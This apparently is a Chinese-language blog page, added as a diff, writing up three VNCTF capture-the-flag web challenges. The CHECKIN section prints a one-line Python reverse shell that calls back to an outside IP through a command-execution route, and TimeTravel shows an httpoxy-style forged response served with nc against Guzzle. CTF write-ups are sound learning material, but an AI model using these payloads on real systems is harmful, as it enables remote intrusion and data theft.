@@ -1,0 +1,218 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>vnctf - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="VNCTF 的刷题记录
+HappyCTFd一个CVE的复原CVE-2020-7245，没有什么好说的
+CHECKIN这个题目算比较简单嘞，
+题目给出源码：
+123456789101112131415,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">vnctf</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">vnctf</h1>
+        <div class="stuff">
+            <span>三月 23, 2021</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p>VNCTF 的刷题记录</p>
+<h1 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h1><p>一个CVE的复原CVE-2020-7245，没有什么好说的</p>
+<h1 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h1><p>这个题目算比较简单嘞，</p>
+<p>题目给出源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route(&#x27;/flag&#x27;)</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/shell&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -f flag.txt&quot;</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以看见shell的part去执行命令了。直接反弹shell</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell?c=python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;81.69.201.65&#x27;,8002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里有一个trick，就是当Python处理文件的时候，若仅仅是open却没有close流的话，还是可以通过proc下读取的，所以我们再次执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;*&#x2F;fd&#x2F;*</span><br></pre></td></tr></table></figure>
+
+<p>即可。</p>
+<h1 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h1><p>学到了..深感自己对于HTTP和NC的了解不足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">&#x27;http://127.0.0.1:5000/api/eligible&#x27;</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="literal">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">&#x27;success&#x27;</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">&#x27;/readflag&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一开始看见有个任意文件读取我就在那猛读，结果啥也没有，后来才知道是GuzzleHttp的漏洞，文章出处：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.laruence.com&#x2F;2016&#x2F;07&#x2F;19&#x2F;3101.html</span><br></pre></td></tr></table></figure>
+
+<p>在文章当中我们就可以看见作者说到：</p>
+<p>所以， 这个漏洞要影响你， 有几个核心前提是:</p>
+<ul>
+<li>你的服务会对外请求资源</li>
+<li>你的服务使用了HTTP_PROXY(大写的)环境变量来代理你的请求（可能是你自己写，或是使用一些有缺陷的类库）</li>
+<li>你的服务跑在PHP的CGI模式下(cgi, php-fpm)</li>
+</ul>
+<p>那么先看phpinfo，确实运行才CGI模式下，之后再看环境代理，作者清楚的写出了http_proxy的Guzzle有缺陷，所以我们可以利用文章中作者给出的姿势：</p>
+<p><img src="image-20210323201359448.png" alt="image-20210323201359448"></p>
+<p>我们利用nc就可以操作到，先监听，之后伪造一个访问的信息即可</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span>: nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span>: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span>: Keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span>: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="image-20210323201426824.png" alt="image-20210323201426824"></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HappyCTFd"><span class="toc-number">1.</span> <span class="toc-text">HappyCTFd</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CHECKIN"><span class="toc-number">2.</span> <span class="toc-text">CHECKIN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TimeTravel"><span class="toc-number">3.</span> <span class="toc-text">TimeTravel</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
